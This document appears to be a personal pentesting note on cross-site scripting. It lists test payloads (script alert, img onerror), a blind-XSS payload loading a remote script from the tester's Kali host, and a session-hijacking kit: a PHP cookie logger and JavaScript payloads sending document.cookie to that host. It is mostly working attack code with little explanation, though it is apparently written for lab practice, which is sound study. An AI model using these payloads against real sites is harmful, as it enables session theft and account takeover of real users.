```html
<script>alert(window.origin)</script>
```

We use this payload as it is a very easy-to-spot method to know when our XSS payload has been successfully executed.

document.cookie

for cookie

```shell-session
"http://SERVER_IP:PORT/index.php?task=test"
```

## DOM Attacks

```html
<img src="" onerror=alert(window.origin)>
```

## Field input Test

```
sudo php -S 0.0.0.0:80
```
```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `"><script src=http://${KaliIP}:80></script>`;

dv.paragraph("```bash\n" + command + "\n```");
```

## Session Hijacking

index.php
```
<?php  
if (isset($_GET['c'])) {  
$list = explode(";", $_GET['c']);  
foreach ($list as $key => $value) {  
$cookie = urldecode($value);  
$file = fopen("cookies.txt", "a+");  
fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");  
fclose($file);  
}  
}  
?>
```

script.js
```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `document.location='http://${KaliIP}/index.php?c='+document.cookie;  
new`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `document.location='http://${KaliIP}:80/index.php?c='+document.cookie;  
new
Image().src='http://${KaliIP}:80/index.php?c='+document.cookie;`;

dv.paragraph("```bash\n" + command + "\n```");
```

Payload
```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `<script src=http://${KaliIP}:80/script.js></script>`;

dv.paragraph("```bash\n" + command + "\n```");
```

